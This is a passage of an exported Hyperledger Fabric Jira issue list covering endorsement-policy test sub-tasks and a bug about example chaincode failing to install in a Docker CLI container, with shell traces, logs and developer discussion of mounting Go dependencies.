
                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

 

Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.

 

NC_1:
{code:java}
Peer0Org1:Member

Peer1Org1:Member

Peer0Org2:Admin

Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js. to match Test Input:
{code:java}
Endorsement Policy: 1 Admin of Org2 & 1 member of Org1

Invoke Sent to: peer0Org2+peer1Org2{code}
for endorsement policy update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]

 

 

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2uf:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"using NC_1 with endorsement policy  ""1 Admin of Org2 & 1 member of Org1"". Send Invoke transaction endorsed by peer0Org2+peer1Org1",FAB-4731,18013,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:24 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does satisfy endorsement policy, the transaction must be sent successfully.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.

 

NC_1:
{code:java}
Peer0Org1:Member

Peer1Org1:Member

Peer0Org2:Admin

Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js. to match 
 Test Input:
{code:java}
Endorsement Policy: 1 Admin of Org2 & 1 member of Org1

Invoke Sent to: peer0Org2+peer1Org1{code}
for endorsement policy update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]

 

 

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2un:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"using NC_2 with endorsement policy  ""1 Admin of Org2 & 1 Admin of Org1"". Send Invoke transaction endorsed by peer0Org2+peer1Org1",FAB-4732,18014,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:24 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does satisfy endorsement policy, the transaction must be sent sucessfully.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

 

Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.

 

NC_2:
{code:java}
Peer1Org1:Admin 
Peer0Org1:Member 
Peer0Org2:Admin 
Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js to match Test Input:
{code:java}
Endorsement Policy: 1 Admin of Org2 & 1 Admin of Org1

Invoke Sent to: peer0Org2+peer1Org1{code}
for endorsement policy update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]

 

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2uv:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"using NC_2 with endorsement policy  ""1 Admin of Org2 & 1 Admin of Org1"". Send Invoke transaction endorsed by peer0Org2+peer0Org1. Invoke fails as expected.",FAB-4733,18015,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:24 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does satisfy endorsement policy, the transaction must be rejected.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

{color:#000000} Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.{color}

 

NC_2:
{code:java}
Peer1Org1:Admin 
Peer0Org1:Member 
Peer0Org2:Admin 
Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js
 to match {color:#000000}Test Input:{color}
{code:java}
Endorsement Policy: 1 Admin of Org2 & 1 Admin of Org1

Invoke Sent to: peer0Org2+peer0Org1{code}
for endorsement policy update:

[https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:

[https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2v3:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Using NC_2, with endorsement policy ""1 Admin of Org2 & 1 Admin of Org1"", Send Invoke transaction endorsed by peer1Org2+peer1Org1. Invoke fails as expected.",FAB-4734,18016,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:24 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does satisfy endorsement policy, the transaction must be rejected.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

{color:#000000} Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.{color}

NC_2:

 
{code:java}
Peer1Org1:Admin 
Peer0Org1:Member 
Peer0Org2:Admin 
Peer1Org2:Member{code}
 Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js

to match Test Input:
{code:java}
Endorsement Policy: 1 Admin of Org2 & 1 Admin of Org1

Invoke Sent to: peer1Org2+peer1Org1{code}
for endorsement policy update :
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:

[https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2vb:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Using NC_2, with endorsement policy ""1 Admin of Org2 & 1 Admin of Org1"", Send Invoke transaction endorsed by   peer1Org2+peer0Org1. Invoke fails as expected",FAB-4735,18017,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:25 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does satisfy endorsement policy, the transaction must be rejected.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

 
 Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.
  Peer Roles:
{code:java}
Peer1Org1:Admin 
Peer0Org1:Member 
Peer0Org2:Admin 
Peer1Org2:Member{code}
 Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js
 to match Test Input:

{code:java}
Endorsement Policy: 1 Admin of Org2 & 1 Admin of Org1

Invoke Sent to: peer1Org2+peer0Org1{code}
 for endorsement policy update:
 
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]
 
 for sending invoke to right peer update:
 
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]
 
  
 


 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2vj:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE sends transactions continuously even with error or failure,FAB-4736,18018,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,15/Jun/17 5:52 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:09 PM,,,,,,fabric-quality,,,,,,0,,,,,,,PTE continues to send transactions if transaction fails to delivered due to target peer or orderer failure.,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy2vr:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode_example04 and chaincode_example05 failing in daily chaincode test env,FAB-4737,18019,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,Nishi,Nishi,15/Jun/17 5:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 10:09 PM,,,,v1.0.0,,fabric-peer,,,,,,0,chaincode,quality,,,,,"fabric commit level: * 0a72230b5d061589a319aaaa0aecd61e7674830c*

chaincode_example04 and chaincode_example05 failing during install on chaincodeTest env.
{code:java}
+ echo ' ***************  BEGIN: Chaincode_Example05 ****************'
+ ORDERER_CA=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/cacerts/ca.example.com-cert.pem
+ echo 'Channel name prefix: channel'
+ echo 'Total channels: 2'
+ echo 'Total Chaincodes: 1'
+ echo 'Total Endorsers: 4'
+ echo -----------------------------------------
+ validateArgs
+ '[' -z install ']'
+ '[' install = install -o install == instantiate -o install == invokeQuery ']'
+ return
+ '[' install = install ']'
+ echo 'Installing chaincode on all Peers ...'
+ installChaincode
+ (( i=0 ))
+ (( 0<4 ))
+ PEER=0
+ setGlobals 0
+ '[' 0 -eq 0 -o 0 -eq 1 ']'
+ export CORE_PEER_LOCALMSPID=Org1MSP
+ CORE_PEER_LOCALMSPID=Org1MSP
+ export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
+ CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
+ export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
+ CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
+ '[' 0 -eq 0 ']'
+ export CORE_PEER_ADDRESS=peer0.org1.example.com:7051
+ CORE_PEER_ADDRESS=peer0.org1.example.com:7051
+ peer chaincode install -n myccex05 -v 1 -p github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example05
2017-06-14 20:41:09.796 UTC [msp] getMspConfig -> INFO 001 intermediate certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts]. Skipping.: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts: no such file or directory]
2017-06-14 20:41:09.798 UTC [msp] getMspConfig -> INFO 002 crls folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts]. Skipping.: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/crls: no such file or directory]
2017-06-14 20:41:09.798 UTC [msp] getMspConfig -> INFO 003 MSP configuration file not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/config.yaml]: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/config.yaml: no such file or directory]
2017-06-14 20:41:09.822 UTC [msp] GetLocalMSP -> DEBU 004 Returning existing local MSP
2017-06-14 20:41:09.822 UTC [msp] GetDefaultSigningIdentity -> DEBU 005 Obtaining default signing identity
2017-06-14 20:41:09.823 UTC [chaincodeCmd] checkChaincodeCmdParams -> INFO 006 Using default escc
2017-06-14 20:41:09.823 UTC [chaincodeCmd] checkChaincodeCmdParams -> INFO 007 Using default vscc
2017-06-14 20:41:09.824 UTC [golang-platform] getCodeFromFS -> DEBU 008 getCodeFromFS github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example05
2017-06-14 20:41:09.896 UTC [golang-platform] func1 -> DEBU 009 Discarding GOROOT package fmt
2017-06-14 20:41:09.896 UTC [golang-platform] func1 -> DEBU 00a Accepting import: github.com/hyperledger/fabric/common/util
2017-06-14 20:41:09.896 UTC [golang-platform] func1 -> DEBU 00b Discarding provided package github.com/hyperledger/fabric/core/chaincode/shim
2017-06-14 20:41:09.896 UTC [golang-platform] func1 -> DEBU 00c Discarding provided package github.com/hyperledger/fabric/protos/peer
2017-06-14 20:41:09.896 UTC [golang-platform] func1 -> DEBU 00d Discarding GOROOT package strconv
2017-06-14 20:41:09.896 UTC [golang-platform] func1 -> DEBU 00e Discarding GOROOT package 
Error: Error getting chaincode code chaincode: Error getting chaincode package bytes: Error obtaining dependencies for github.com/hyperledger/fabric/common/util: go list: failed with error: ""exit status 1""
can't load package: package github.com/hyperledger/fabric/common/util: cannot find package ""github.com/hyperledger/fabric/common/util"" in any of:
	/opt/go/src/github.com/hyperledger/fabric/common/util (from $GOROOT)
	/opt/gopath/src/github.com/hyperledger/fabric/common/util (from $GOPATH)

Usage:
  peer chaincode install [flags]

Flags:
  -c, --ctor string      Constructor message for the chaincode in JSON format (default ""{}"")
  -l, --lang string      Language the chaincode is written in (default ""golang"")
  -n, --name string      Name of the chaincode
  -p, --path string      Path to chaincode
  -v, --version string   Version of the chaincode specified in install/instantiate/upgrade commands

Global Flags:
      --cafile string              Path to file containing PEM-encoded trusted certificate(s) for the ordering endpoint
      --logging-level string       Default logging level and overrides, see core.yaml for full syntax
  -o, --orderer string             Ordering service endpoint
      --test.coverprofile string   Done (default ""coverage.cov"")
      --tls                        Use TLS when communicating with the orderer endpoint

+ res=1
+ verifyResult 1 'Chaincode '\''myccex05'\'' installation on PEER0 has Failed'
+ '[' 1 -ne 0 ']'
+ echo '!!!!!!!!!!!!!!! Chaincode' ''\''myccex05'\''' installation on PEER0 has 'Failed !!!!!!!!!!!!!!!!'
+ echo '================== ERROR !!! FAILED to execute End-2-End Scenario example05 =================='
+ echo '!!!!!!!!!!!!!!! Chaincode' ''\''myccex05'\''' installation on PEER0 has 'Failed !!!!!!!!!!!!!!!!'
+ echo '================== ERROR !!! FAILED to execute End-2-End Scenario example05 =================='
+ echo
++ date +%s
+ echo 'Total execution time 0 secs'
+ exit 1

{code}
In docker-compose.yaml file we have the following for container
{code:java}
cli:
    container_name: cli
    image: hyperledger/fabric-tools
{code}",,binhn,mastersingh24,muralisr,nickgaski,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/17 6:40 AM;Nishi;docker-compose.yaml;https://jira.hyperledger.org/secure/attachment/11083/docker-compose.yaml","15/Jun/17 6:31 AM;Nishi;e2e_test_example04.sh;https://jira.hyperledger.org/secure/attachment/11081/e2e_test_example04.sh","15/Jun/17 6:31 AM;Nishi;e2e_test_example05.sh;https://jira.hyperledger.org/secure/attachment/11082/e2e_test_example05.sh",,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2vz:",,,,,,,,,,,,,,,,,,,,,,,binhn,mastersingh24,muralisr,nickgaski,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/17 6:11 AM;muralisr;[~Nishi] can you add the docker compose and instructions to recreate please ?;;;","15/Jun/17 6:40 AM;Nishi;To reproduce inside vagrant:
 # Copy attached (.sh) files to folder ""fabric/test/regression/daily/chaincodeTests/fabricFeatureChaincodes""
 # Open testYourChaincode.py from ""fabric/test/regression/daily/chaincodeTests/envsetup""
 #   comment the line +_@unittest.skip(""skipping"")_+ to unskip chaincode_example04  test by adding  # infront as *#*_@unittest.skip(""skipping"") to run test the following test_
     def test_FAB3796_example04_chaincode_to_chaincode_call_on_occurrence_of_an_event(self)
 # Open docker-compose.yaml file and update cli container section to use ""image: hyperledger/fabric-tools""
 # cd ""fabric/test/regression/daily/chaincodeTests""
 # run runChaincodes.sh

 

This should reproduce the failure.;;;","15/Jun/17 12:01 PM;muralisr;[~Nishi] I get the following error

./runChaincodes.sh: line 12: py.test: command not found

I didn't find py.test anywhere. Let me know if I'm missing something.;;;","15/Jun/17 12:11 PM;muralisr;[~Nishi] figured I had to do 

sudo pip install -U pytest

Perhaps this is there in some instructions ?;;;","15/Jun/17 5:13 PM;muralisr;[~Nishi] The *cli* docker service used for installing and instantiating the chaincode creates the image and container for the chaincode. Since we are not packaging everything like we used to (to reduce the chaincode size) it is upto the user to provide import dependencies of the chaincode. In this case, chaincode_example04 imports common/util which further has dependencies on fabric/vendor. As the CLI service does not have those in its image, it must be provided. I did this by mounting those packages from host env 
{code:java}
volumes:
 - /var/run/:/host/var/run/
 - ../../../../../common:/opt/gopath/src/github.com/hyperledger/fabric/common
 - ../../../../../vendor:/opt/gopath/src/github.com/hyperledger/fabric/vendor
 - ../../../../../examples/chaincode/go:/opt/gopath/src/github.com/hyperledger/fabric/examples/chaincode/go
 - ../../../../../../../decimal/:/opt/gopath/src/github.com/shopspring/decimal/
 - ./channel-artifacts:/opt/gopath/src/github.com/hyperledger/fabric/peer/channel-artifacts
 - ./crypto-config:/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto
 - ./scripts:/opt/gopath/src/github.com/hyperledger/fabric/peer/scripts1
 - ../fabricFeatureChaincodes:/opt/gopath/src/github.com/hyperledger/fabric/test/regression/daily/chaincodeTests/fabricFeatureChaincodes
{code}

With that it works as expected. Please close this once confirmed.;;;","15/Jun/17 10:24 PM;Nishi;After adding these two lines (as Murali suggested) to already mounted volumes under cli container

 - ../../../../../common:/opt/gopath/src/github.com/hyperledger/fabric/common
  - ../../../../../vendor:/opt/gopath/src/github.com/hyperledger/fabric/vendor

 

Could successfully run chaincode_example04 and chaincode_example05 tests inside chaincode tests environment successfully.

fabric commit level:  *0a72230b5d061589a319aaaa0aecd61e7674830c*

 ;;;","15/Jun/17 10:56 PM;Nishi;Murali,

 How do we expect customers to know this? Is this documented?

Why do we have to mount fabric/common? Is this specific to way 04 and 05 chaincode examples are implemented? Could we have avoided this by providing this via shim?

As a chaincode developer, how would I supply other dependencies that accompany install?

Do these dependencies all exist in vendor package?

 

 Thanks!

-Nishi;;;","15/Jun/17 11:21 PM;muralisr;[~Nishi]   [~binhn] and I were just discussing documenting this in the ongoing doc work.

Two things to note
* CLI is NOT the peer (it is like the SDK)
* user has to get the dependencies so install can package it.

For example, if the chaincode imported ""github.com/some/external/code"", that code has to made available to the CLI so install can package it. The chaincode dev gets the code in his host for testing and now has to make it available in the cli service so it can package and install.  If sh's working directly off the host, then the dependent package is in the GOPATH and nothing more needs to be done (which is why if you ran the test in vagrant or on the host, it'll just work). If she's using a docker cli service, mounting volume is the simplest way to make the code available to the container. 

In this test ""common/util"" is that external dependency (equivalent to the ""github.com/some/external/code"" example).

Just as you don't vendor if you are using the host or vagrant, you don't have to vendor if you are using the CLI docker service. You just have to make the dependencies available in the GOPATH within the service (which is what we did with the volume mount).;;;","16/Jun/17 4:04 AM;Nishi;Would like to review the steps in documentation before marking it as done.

Since customers may run into this situation.

Adding [~nickgaski]

 ;;;","16/Jun/17 4:48 AM;Clayton Sims;Is this in review?  I don't see change set?;;;","16/Jun/17 5:09 AM;muralisr;[~Clayton Sims] this is working per design. Developers have to make chaincode dependencies available to the CLI docker container (its already available to the host). This would have been more starkly evident if we had use an external import such as ""github.com/some/external/code"". 
But we can have a CR for docing or add it to ongoing chaincode doc CR https://gerrit.hyperledger.org/r/#/c/9263/.

[~Nishi] Makes sense to have this doced properly. Best with an example even [~nickgaski]. 

Can we  change high to medium ?;;;","16/Jun/17 9:39 PM;mastersingh24;While I agree on documenting how packaging works, this actually reveals something worse:  NO EXAMPLE CHAINCODE should be using fabric packages.  Fabric is not an importable library (other than the shim and unfortunately the protos/peer :-( )

IMHO - the use of util should be removed from this example;;;","16/Jun/17 9:53 PM;muralisr;[~mastersingh24]  Agreed. use of ""github.com/hyperledger/fabric/common/util"" gives the impression any ""fabric"" package is available for import directly. Only those in ""ccenv"" (shim and protos for example) are. We got away with this when we included the world.

(Apologize for repeating this but its worth it... ) This is not a bug or a limitation... the test would have worked if executing directly from the host where these ""external"" packages were available in the GOPATH. Its just that they have to be made available to the container to pick up for packaging.

[~Nishi] a suggestion... perhaps find a replacement for  ""github.com/hyperledger/fabric/common/util"" in those chaincodes as part of a future CR ? It'll make the docker compose file a tad simpler.;;;","21/Jun/17 12:25 AM;binhn;waiting to be closed – need document on chaincode dependencies accessible from container;;;","21/Jun/17 5:01 AM;Nishi;[~nickgaski] here is what we got for documentation with feedback from [~muralisr] :
{code:java}
Chaincode import dependencies
=============================

Chaincode has to import three kinds of packages
1 in built packages available via GOROOT (e.g., ""fmt"", ""time"")
2 fabric packages needed for the chaincode
    - github.com/hyperledger/fabric/protos
    - github.com/hyperledger/fabric/core/chaincode/shim
3 external packages needed by the chaincode

This document deals with 3.

Typically developer should make sure chaincode works in
non-docker env before trying it out in docker env.

Non-docker env. development where the fabric is cloned
======================================================

Let us say the chaincode is in GOPATH and imports ""github.com/my/dependent/package"".

1. do ""go get github.com/my/dependent/package"" to get the chaincode in the GOPATH
2. test the chaincode (usual install, instantiate, invoke steps)

One could also vendor the package so it appears under ""vendor/"" in the the chaincode
package folder.

Docker compose env. development
===============================
The key to docker development is to make the chaincode dependent external package
available in the docker service by mounting those packages (""github.com/my/dependent/package"") in the docker service
so they resolve correctly in the containers GOPATH


{code}
 

 ;;;","21/Jun/17 7:59 AM;nickgaski;this is addressed - [https://gerrit.hyperledger.org/r/#/c/10719/];;;",,,,,,,,,,,,,,,,,,,,,,,
PATH and GOROOT should be noted in the doc,FAB-4738,18020,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,shimos,shimos,shimos,15/Jun/17 7:03 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 3:00 AM,v1.0.0-beta,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"During behave test(bddtests), I met some errors when PATH and GOROOT are not set properly.
Although GOPATH is noted in the documents, as far as I know, PATH and GOROOT are not clearly mentioned in the documents.
These should be specified as prerequisites for developers, as this would be the case for new behave tests(test/feature).

Details of errors:

1. PATH not including build/bin

The peer command is called during the behave test, and it is located in build/bin, which usually does not appear in PATH unless you explicitly set it.
{noformat}
$ behave
...(snip)…
    And user ""peer0Admin"" using cert alias ""peer-admin-cert"" creates a install proposal ""installProposal1"" for channel ""com.acme.blockchain.jdoe.channel1"" using chaincode spec ""ccSpec""
                # steps/endorser_impl.py:41 0.009s
      Traceback (most recent call last):
        File ""/home/ubuntu/Envs/behave_venv/local/lib/python2.7/site-packages/behave/model.py"", line 1456, in run
          match.run(runner.context)
        File ""/home/ubuntu/Envs/behave_venv/local/lib/python2.7/site-packages/behave/model.py"", line 1903, in run
          self.func(context, *args, **kwargs)
        File ""steps/endorser_impl.py"", line 49, in step_impl
          ccDeploymentSpec = endorser_util.createDeploymentSpec(context=context, ccSpec=ccSpec)
        File ""/opt/gopath/src/github.com/hyperledger/fabric/bddtests/steps/endorser_util.py"", line 178, in createDeploymentSpec
          _createDeploymentSpecAsFile(ccSpec=ccSpec, outputPath=outputPath)
        File ""/opt/gopath/src/github.com/hyperledger/fabric/bddtests/steps/endorser_util.py"", line 166, in _createDeploymentSpecAsFile
